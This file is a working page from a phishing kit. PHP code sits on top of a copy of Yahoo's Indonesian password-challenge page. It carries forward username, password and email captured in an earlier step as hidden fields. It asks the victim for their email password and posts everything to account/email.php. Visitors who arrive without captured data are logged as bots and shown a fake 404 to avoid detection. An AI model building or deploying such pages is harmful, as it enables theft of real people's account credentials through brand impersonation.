<?php
session_start();
error_reporting(0);
$username = $_POST['username'];
$password = $_POST['password'];
$email = $_POST['email'];
if($username == "" && $password == "" && $email == ""){
tulis_file("../../total_bot.txt", $ip);
exit(header("HTTP/1.0 404 Not Found"));
}
?>
<html id="Stencil" class="js grid mobile light-theme "><head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <meta name="description" content="Yahoo">
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/62205dc2a2762fc002fa952931dfe21f58f71fc5/yahoo-main.css" rel="stylesheet" type="text/css">
        <script nonce="">
            var pageStartTime = new Date().getTime();
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794277019;
root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002Faccount\u002Fchallenge\u002Fpassword?.intl=id&.lang=id-ID&pspid=965640046&src=fpctx&display=narrow";
root.I13N_config.referrer = "https:\u002F\u002Flogin.yahoo.com\u002F?.src=fpctx&.intl=id&.lang=id-ID&pspid=965640046";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.pg_name = "passwordChallenge";
root.I13N_config.keys.gm_np = "yahoo";
root.I13N_config.keys.src = "fpctx";
root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
root.I13N_config.keys.test = "mbr-change-password-v2,mbr-signin-with-google,mbr-control-paid-user-ar,mbr-harmony-sign-up-control,mbr-cc-add-text-1,mbr-ytwstock-signin-with-google,mbr-fnapp-signin-with-google,mbr-harmony-signup-control,mbr-inactive-signout";
root.mKeyPrefix = "password-challenge-";
root.I13N_config.keys.cause = "missing";
root.I13N_config.keys.src_id = "965640046";
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1610896107255;
root.challenge.isAndroidWebview = false;
root.I13N_config.keys.context = "primary";
root.pwchallenge || (root.pwchallenge = {});
root.pwchallenge.messages = {"toolTipShow":"Tampilkan kata&nbsp;sandi","toolTipHide":"Sembunyikan kata&nbsp;sandi"};
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=5d5u84dg08knb&crumb=' + encodeURIComponent('fX6V8DbHXJA') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script>
    </head>
    <body class="bucket-mbr-signin-with-google bucket-mbr-harmony-sign-up-control bucket-mbr-cc-add-text-1">
    <script nonce="">
        (function(root) {
            var doc = document;
            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
            }
        }(this));
    </script>
    <div id="login-body" class="loginish  puree-v2 grid ">
    <div class="mbr-login-hd" id="mbr-uh-hd">
     <a href="https://id.yahoo.com/">
        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-id-ID" width="" height="27">
        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-id-ID" width="" height="27">
    </a>
</div>
    <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><?php echo $email; ?></div>
    </div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter your&nbsp;password</strong>
        <form action="account/email.php" method="post" class="challenge-form">
        <input type="hidden" name="username" value="<?php echo $username; ?>">
        <input type="hidden" name="password" value="<?php echo $password; ?>">
        <input type="hidden" name="email" value="<?php echo $email; ?>">
        <div id="password-container" class="input-group password-container ">
            <input type="password" id="login-passwd" class="password" name="email_password" placeholder=" " required="">
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Tombol Capslock&nbsp;aktif"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password" data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:password-challenge-toggle-show-hide">
            </button>
        </div>

        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" value="Log in">
                    Log in
            </button>
        </div>
        <div class="forgot-cont challenge-button-link">
            <form action="#">
            <button type="button" class="pure-button puree-button-link challenge-button-link">Forgot&nbsp;password?</button>
            </form>
        </div>
    </form>
</div>
</div>
    
    
</div>
    <script src="https://s.yimg.com/wm/mbr/js/rapid-3.53.17.js"></script>
    <script src="https://s.yimg.com/wm/mbr/62205dc2a2762fc002fa952931dfe21f58f71fc5/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=fX6V8DbHXJA&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Tutup peringatan&nbsp;ini">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
                Yahoo berfungsi optimal dengan browser versi terkini. Anda menggunakan browser yang sudah usang atau tidak didukung, dan beberapa fitur Yahoo mungkin tidak berfungsi dengan baik. Silakan perbarui versi browser Anda sekarang. <a href="">Info lebih&nbsp;lanjut</a>
        </p>
    </div>
    <script nonce="">
        (function(root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>
    

<!-- fe08.member.sg3.yahoo.com - Sun Jan 17 2021 15:08:27 GMT+0000 (Coordinated Universal Time) - (0ms) --></body></html>